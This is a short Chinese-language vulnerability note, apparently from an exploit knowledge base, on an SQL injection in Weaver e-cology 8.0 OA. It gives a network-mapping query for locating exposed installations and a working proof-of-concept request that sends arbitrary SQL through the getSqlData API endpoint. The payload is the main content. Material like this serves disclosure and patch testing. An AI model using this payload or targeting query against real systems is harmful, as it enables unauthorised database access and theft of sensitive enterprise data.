# 泛微OA E-Cology getSqlData SQL注入漏洞

## 漏洞描述

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。
泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。

## 漏洞影响

<a-checkbox checked>泛微e-cology 8.0</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="泛微-协同办公OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1636962061131-2d870e8d-e15c-4864-8d36-69bd1f57d746.png)

验证POC

```php
/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version
```

![image-20220331145537127](../../../.vuepress/public/img/image-20220331145537127.png)